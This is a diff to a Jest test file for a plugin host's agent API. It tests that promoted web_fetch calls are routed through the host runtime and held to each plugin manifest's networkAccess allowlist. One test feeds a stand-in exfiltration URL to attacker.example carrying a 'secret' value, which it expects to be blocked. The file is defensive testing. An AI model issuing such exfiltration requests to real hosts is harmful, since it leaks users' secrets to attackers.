@@ -18,6 +18,10 @@ import {
   __resetPluginProtocolAdaptersForTesting,
 } from "@/lib/ai/agent/external/protocol-adapter"
 import { invokePluginTool } from "@/lib/plugin/core/invoke-plugin-tool"
+import {
+  __resetPluginHostRuntimesForTesting,
+  setAmbientHostRuntime,
+} from "@/lib/plugin/runtime/host-runtime"
 import { usePluginModalStore } from "@/stores/plugin-runtime/plugin-modal-store"
 import {
   initializePluginPermissions,
@@ -182,13 +186,21 @@ jest.mock("@/stores/settings", () => ({
 // Mock the imperative agent-execution entry points (dynamically imported by
 // `createAgentAPI`). The background-agent-manager + permission-api stay REAL
 // so cancellation registration and permission gating are exercised end-to-end.
-jest.mock("@/lib/ai/agent/agent-executor", () => ({
-  executeAgent: jest.fn(async () => ({
+jest.mock("@/lib/ai/agent/agent-executor", () => {
+  // The execution service dispatches through the rail functions, not
+  // `executeAgent` directly. Both rails delegate to the one mock so every
+  // assertion below still reads the config the service actually built.
+  const executeAgent = jest.fn(async () => ({
     text: "agent reply",
     channel: "text",
     toolsAvailable: false,
-  })),
-}))
+  }))
+  return {
+    executeAgent,
+    runAgentRail: (...a: unknown[]) => executeAgent(...(a as [])),
+    runCompletionRail: (...a: unknown[]) => executeAgent(...(a as [])),
+  }
+})
 jest.mock("@/lib/plugin/core/invoke-plugin-tool", () => ({
   invokePluginTool: jest.fn(async (pluginId: string, toolName: string) => ({
     result: { ok: true, toolName },
@@ -214,6 +226,10 @@ const mockManifest: PluginManifest = {
   author: { name: "Test" },
   main: "index.ts",
   permissions: ["network:fetch", "network:upload"],
+  networkAccess: {
+    allowedDomains: ["*"],
+    reasoning: "Test fixture: exercises the unrestricted-egress opt-in.",
+  },
 }
 
 const createMockPlugin = (overrides?: Partial<Plugin>): Plugin => ({
@@ -226,6 +242,9 @@ const createMockPlugin = (overrides?: Partial<Plugin>): Plugin => ({
 })
 
 const mockManager = {
+  // The promoted `web_fetch` reads the caller's manifest to apply the same
+  // `networkAccess` egress clamp `ctx.network` gets, so the stub has to answer.
+  getPlugin: jest.fn(() => createMockPlugin()),
   getPluginPointGovernanceMode: jest.fn(() => "warn"),
   createPluginServicesAPI: jest.fn(() => ({
     isAvailable: () => false,
@@ -1803,23 +1822,179 @@ describe("agent imperative API", () => {
   describe("invokeTool", () => {
     const mockInvokePluginTool = invokePluginTool as jest.MockedFunction<typeof invokePluginTool>
 
+    afterEach(() => {
+      __resetPluginHostRuntimesForTesting()
+    })
+
     it("rejects without the agent:control permission", async () => {
       const ctx = createPluginContext(createMockPlugin(), mockManager)
-      await expect(ctx.agent.invokeTool("web_fetch", { url: "x" })).rejects.toThrow(/agent:control/)
+      await expect(ctx.agent.invokeTool("own_tool", { url: "x" })).rejects.toThrow(/agent:control/)
       expect(mockInvokePluginTool).not.toHaveBeenCalled()
     })
 
     it("routes to invokePluginTool and unwraps the result once granted", async () => {
       initializePluginPermissions(PLUGIN_ID, ["agent:control"])
       const ctx = createPluginContext(createMockPlugin(), mockManager)
-      const result = await ctx.agent.invokeTool("web_fetch", { url: "x" })
+      const result = await ctx.agent.invokeTool("own_tool", { url: "x" })
       expect(mockInvokePluginTool).toHaveBeenCalledWith(
         PLUGIN_ID,
-        "web_fetch",
+        "own_tool",
         { url: "x" },
-        expect.objectContaining({ reason: expect.stringContaining("web_fetch") })
+        expect.objectContaining({ reason: expect.stringContaining("own_tool") })
       )
-      expect(result).toEqual({ ok: true, toolName: "web_fetch" })
+      expect(result).toEqual({ ok: true, toolName: "own_tool" })
+    })
+
+    it("forwards the caller's session and message ids to the plugin's own tool", async () => {
+      initializePluginPermissions(PLUGIN_ID, ["agent:control"])
+      const ctx = createPluginContext(createMockPlugin(), mockManager)
+      await ctx.agent.invokeTool("own_tool", {}, { sessionId: "s1", messageId: "m1" })
+      expect(mockInvokePluginTool).toHaveBeenCalledWith(
+        PLUGIN_ID,
+        "own_tool",
+        {},
+        expect.objectContaining({ sessionId: "s1", messageId: "m1" })
+      )
+    })
+
+    it("routes an author-callable host tool to the host runtime, not the plugin registry", async () => {
+      // The promoted web tools must reach the HOST's search/fetch policy. If
+      // they fell through to `invokePluginTool` a plugin could shadow them by
+      // registering the same name — and the host's cache, source verification,
+      // SSRF guard and rate limiter would be bypassed.
+      initializePluginPermissions(PLUGIN_ID, ["agent:control"])
+      const runHostTool = jest.fn(async () => ({ ok: true, results: [] }))
+      setAmbientHostRuntime(() => ({
+        runHostTool,
+        chat: async function* () {},
+        embed: async () => [],
+        getDefaultProvider: () => "openai",
+        getDefaultModel: () => "gpt-4o",
+      }))
+      const ctx = createPluginContext(createMockPlugin(), mockManager)
+      const result = await ctx.agent.invokeTool("web_search", { query: "cognia" })
+      expect(runHostTool).toHaveBeenCalledWith("web_search", { query: "cognia" }, {})
+      expect(mockInvokePluginTool).not.toHaveBeenCalled()
+      expect(result).toEqual({ ok: true, results: [] })
+    })
+
+    it("resolves the host runtime for the session the caller named", async () => {
+      initializePluginPermissions(PLUGIN_ID, ["agent:control"])
+      const seen: Array<string | undefined> = []
+      setAmbientHostRuntime((request) => {
+        seen.push(request.sessionId)
+        return {
+          runHostTool: async () => ({ ok: true }),
+          chat: async function* () {},
+          embed: async () => [],
+          getDefaultProvider: () => "openai",
+          getDefaultModel: () => "gpt-4o",
+        }
+      })
+      const ctx = createPluginContext(createMockPlugin(), mockManager)
+      await ctx.agent.invokeTool("web_fetch", { url: "https://x" }, { sessionId: "s-42" })
+      expect(seen).toEqual(["s-42"])
+    })
+
+    it("clamps a promoted web_fetch to the manifest's networkAccess allowlist", async () => {
+      // Running host-side reuses the host's SSRF guard, which does not know the
+      // plugin. Without this clamp `agent:control` alone bought a plugin
+      // unrestricted egress through a door `ctx.network` keeps shut.
+      initializePluginPermissions(PLUGIN_ID, ["agent:control"])
+      const runHostTool = jest.fn(async () => ({ ok: true }))
+      setAmbientHostRuntime(() => ({
+        runHostTool,
+        chat: async function* () {},
+        embed: async () => [],
+        getDefaultProvider: () => "openai",
+        getDefaultModel: () => "gpt-4o",
+      }))
+      ;(mockManager.getPlugin as jest.Mock).mockReturnValueOnce(
+        createMockPlugin({
+          manifest: {
+            ...mockManifest,
+            networkAccess: { allowedDomains: ["api.allowed.test"] },
+          },
+        })
+      )
+      const ctx = createPluginContext(createMockPlugin(), mockManager)
+      const result = await ctx.agent.invokeTool("web_fetch", {
+        url: "https://attacker.example/exfil?d=secret",
+      })
+      expect(runHostTool).not.toHaveBeenCalled()
+      expect(result).toMatchObject({ ok: false, code: "blocked" })
+    })
+
+    it("allows a promoted web_fetch to a host the manifest declared", async () => {
+      initializePluginPermissions(PLUGIN_ID, ["agent:control"])
+      const runHostTool = jest.fn(async () => ({ ok: true, status: 200 }))
+      setAmbientHostRuntime(() => ({
+        runHostTool,
+        chat: async function* () {},
+        embed: async () => [],
+        getDefaultProvider: () => "openai",
+        getDefaultModel: () => "gpt-4o",
+      }))
+      ;(mockManager.getPlugin as jest.Mock).mockReturnValueOnce(
+        createMockPlugin({
+          manifest: {
+            ...mockManifest,
+            networkAccess: { allowedDomains: ["api.allowed.test"] },
+          },
+        })
+      )
+      const ctx = createPluginContext(createMockPlugin(), mockManager)
+      await ctx.agent.invokeTool("web_fetch", { url: "https://api.allowed.test/v1/thing" })
+      expect(runHostTool).toHaveBeenCalledWith(
+        "web_fetch",
+        { url: "https://api.allowed.test/v1/thing" },
+        {}
+      )
+    })
+
+    it("leaves the SSRF target policy to the executor that knows allowPrivateHosts", async () => {
+      // The clamp answers ONE question: is this host inside the manifest's
+      // allowlist. Deciding the private-host question here too re-decided it
+      // with the default policy, so a user who turned on Settings → Search →
+      // "allow private hosts" still got a refusal — reported as the plugin's
+      // own `["*"]` denying it.
+      initializePluginPermissions(PLUGIN_ID, ["agent:control"])
+      const runHostTool = jest.fn(async () => ({ ok: true, status: 200 }))
+      setAmbientHostRuntime(() => ({
+        runHostTool,
+        chat: async function* () {},
+        embed: async () => [],
+        getDefaultProvider: () => "openai",
+        getDefaultModel: () => "gpt-4o",
+      }))
+      ;(mockManager.getPlugin as jest.Mock).mockReturnValueOnce(
+        createMockPlugin({
+          manifest: { ...mockManifest, networkAccess: { allowedDomains: ["*"] } },
+        })
+      )
+      const ctx = createPluginContext(createMockPlugin(), mockManager)
+      const result = await ctx.agent.invokeTool("web_fetch", { url: "http://192.168.1.10/api" })
+      expect(result).not.toMatchObject({ code: "blocked" })
+      expect(runHostTool).toHaveBeenCalledWith("web_fetch", { url: "http://192.168.1.10/api" }, {})
+    })
+
+    it("refuses a promoted web_fetch when the manifest declares no networkAccess", async () => {
+      initializePluginPermissions(PLUGIN_ID, ["agent:control"])
+      const runHostTool = jest.fn(async () => ({ ok: true }))
+      setAmbientHostRuntime(() => ({
+        runHostTool,
+        chat: async function* () {},
+        embed: async () => [],
+        getDefaultProvider: () => "openai",
+        getDefaultModel: () => "gpt-4o",
+      }))
+      ;(mockManager.getPlugin as jest.Mock).mockReturnValueOnce(
+        createMockPlugin({ manifest: { ...mockManifest, networkAccess: undefined } })
+      )
+      const ctx = createPluginContext(createMockPlugin(), mockManager)
+      const result = await ctx.agent.invokeTool("web_fetch", { url: "https://api.allowed.test/x" })
+      expect(runHostTool).not.toHaveBeenCalled()
+      expect(result).toMatchObject({ ok: false, code: "blocked" })
     })
 
     it("rejects an empty tool name", async () => {
